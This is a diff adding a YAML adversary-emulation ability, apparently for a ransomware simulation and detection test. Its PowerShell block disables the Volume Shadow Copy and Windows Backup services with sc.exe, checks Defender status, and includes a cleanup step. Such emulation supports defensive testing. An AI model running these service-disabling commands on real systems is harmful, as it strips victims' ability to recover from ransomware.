@@ -1,0 +1,34 @@
+---
+- id: scn008-a1-disable-defenses
+  name: "SCN-008 | Disable Backup and Recovery Services"
+  description: |
+    Disables Volume Shadow Copy (VSS) and Windows Backup (WBEngine) services
+    to prevent recovery after ransomware encryption — a standard ransomware
+    pre-deployment step. Also checks Windows Defender real-time protection
+    status. Uses native sc.exe — no external tools required. This is one
+    of the highest-confidence ransomware precursor signals in MDR telemetry.
+    Maps to T1562.001.
+  tactic: defense-evasion
+  technique:
+    attack_id: T1562.001
+    name: "Impair Defenses: Disable or Modify Tools"
+  platforms:
+    windows:
+      psh:
+        command: |
+          Write-Output "=== RANSOMWARE PHASE 1: DISABLE DEFENSES (T1562.001) ===";
+          Write-Output "[*] Stopping Volume Shadow Copy service (VSS)...";
+          sc.exe config vss start= disabled 2>&1;
+          Write-Output "[*] Stopping Windows Backup Engine service (WBEngine)...";
+          sc.exe config wbengine start= disabled 2>&1;
+          Write-Output "";
+          Write-Output "[*] Checking Windows Defender status:";
+          Get-MpComputerStatus | Select-Object AMRunningMode, RealTimeProtectionEnabled |
+            Format-Table -AutoSize;
+          Write-Output "[*] Defense impairment phase complete";
+          Write-Output "[*] Sophos MDR detects: service config change on VSS/WBEngine = ransomware signal";
+          Write-Output "=== END DEFENSE IMPAIRMENT ==="
+        cleanup: |
+          sc.exe config vss start= demand 2>&1;
+          sc.exe config wbengine start= demand 2>&1;
+          Write-Output "Services restored to on-demand start"
